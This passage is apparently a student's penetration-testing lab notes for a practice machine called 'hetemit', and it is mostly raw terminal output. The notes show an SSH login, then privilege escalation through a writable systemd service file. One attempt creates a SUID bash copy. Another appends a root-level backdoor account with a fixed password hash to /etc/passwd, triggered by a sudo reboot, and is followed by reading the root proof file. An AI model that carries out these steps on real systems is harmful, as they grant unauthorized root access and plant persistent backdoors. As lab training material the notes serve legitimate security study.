ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxTqZC9zdTSFte3KadddXjUQKjFD/qTMq1KLLthEcf8EeZB0cx4GnC+msACTX7tYfvtBR8702YE16Xz8jD6GIb/JAc3LPm1UHTbAeRzlpmo2fWqAGuUmX6BJ+1eEGDVKdeD0aK/zjTjaMRSCowFfaaOgtwyMdELQibz3y7UtD9vVZ1D5qlpRUOfsKHTfpS3IIHek0XK91K/M8C2XoeKEsVscWjAmHACg/inAJwjpxK7I02LJUgJ2X4qx4tqmFVjeJnXcxUn4hB56bv8IQ++rtnOSw86sJrf206WXuonmQ8LWdQilmaNm2c7jAdGMPo+zXMjgmGLiSLnCw8ZSlYkcg5ma0Uq0SA+Cr0iypqU/AkRJqVCTgA72VVI/WPylJ7vjFJgLyt3v3W5PkRqih963vnqt8B/irKZl539BW7ySJyviynRCwaDaaCCSJeZzP5pol7HUO0+3J4HBeY/YgpSEuzTpUwuhV5H6gxgmMSRZlp+FcOvKXBTOgFqJQeDq+sYQs= kali@DESKTOP-61F9HO2                                                                                                                                   ┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          
└─$ ssh cmeeks@192.168.49.69
The authenticity of host '192.168.49.69 (192.168.49.69)' can't be established.          
ED25519 key fingerprint is SHA256:fQjalbiq+g5IAZ/A1LG0Dg842omO07jqbU2NIIdy0HU.          
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? 
^C

┌──(kali㉿DESKTOP-61F9HO2)-[~]
└─$ ssh cmeeks@192.168.69.117
The authenticity of host '192.168.69.117 (192.168.69.117)' can't be established.
ED25519 key fingerprint is SHA256:lncQzilVmJcYmSxhFreTweZeyaqTAiomI9pvTK0k7ac.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.69.117' (ED25519) to the list of known hosts.
Activate the web console with: systemctl enable --now cockpit.socket

[cmeeks@hetemit ~]$ 
```

# Privesc

```
[cmeeks@hetemit tmp]$ cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App                                                                  
After=network-online.target

[Service]                                                                               
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000                                                 
TimeoutSec=30                                                                           
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID                                                     
Restart=on-failure

[Install]                                                                               
WantedBy=multi-user.target
[cmeeks@hetemit tmp]$ nano /etc/systemd/system/pythonapp.service
[cmeeks@hetemit tmp]$ cat /etc/systemd/system/pythonapp.service                         
[Unit]
Description=Python App
After=network-online.target                                                                                                                                                     [Service]                                                                               
Type=simple                                                                             WorkingDirectory=/home/cmeeks/restjson_hetemit                                          
ExecStart=cp /bin/bash /bash && chmod u+s /bash
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
[cmeeks@hetemit tmp]$ 
[cmeeks@hetemit tmp]$ sudo -l
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",                
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",                    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin                                                                                                                                User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
[cmeeks@hetemit tmp]$ sudo /sbin/reboot
Connection to 192.168.69.117 closed by remote host.
Connection to 192.168.69.117 closed.
```
That failed

Try again
```
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service                           
[Unit]
Description=Python App                                                                  
After=network-online.target                                                             
[Service]                                                                               
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit                                          
ExecStart=echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash" >> /etc/passwd
TimeoutSec=30                                                                           
RestartSec=15s
User=root                                                                               
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure                                                                      
[Install]                                                                               
WantedBy=multi-user.target
[cmeeks@hetemit ~]$ sudo -l
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
[cmeeks@hetemit ~]$ sudo /sbin/reboot
Connection to 192.168.69.117 closed by remote host.
Connection to 192.168.69.117 closed.

┌──(kali㉿DESKTOP-61F9HO2)-[~] 
```

```
[cmeeks@hetemit ~]$ nano /etc/systemd/system/pythonapp.service
[cmeeks@hetemit ~]$ sudo /sbin/reboot
Connection to 192.168.69.117 closed by remote host.
Connection to 192.168.69.117 closed.

┌──(kali㉿DESKTOP-61F9HO2)-[~]
└─$ ssh cmeeks@192.168.69.117
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Sun Mar 13 15:23:03 2022 from 192.168.49.69
[cmeeks@hetemit ~]$ cd ..
[cmeeks@hetemit home]$ su dummyroot
Password:
[root@hetemit home]# cd /root
[root@hetemit ~]# cat /etc/systemd/system/pythonapp.service
[Unit]
Description=rooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash" >> /etc/passwd'

[Install]
WantedBy=multi-user.target
[root@hetemit ~]# cat proof.txt
4df60cf6e60aace91b65f487e63028d1
[root@hetemit ~]# /sbin/ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.69.117  netmask 255.255.255.0  broadcast 192.168.69.255
        ether 00:50:56:ba:67:65  txqueuelen 1000  (Ethernet)
        RX packets 166  bytes 17150 (16.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 106  bytes 13945 (13.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 25  bytes 4957 (4.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 25  bytes 4957 (4.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[root@hetemit ~]# cat
```

https://alvinsmith.gitbook.io/progressive-oscp/untitled/vulnversity-privilege-escalation

![](Pasted%20image%2020220320163600.png)

# Others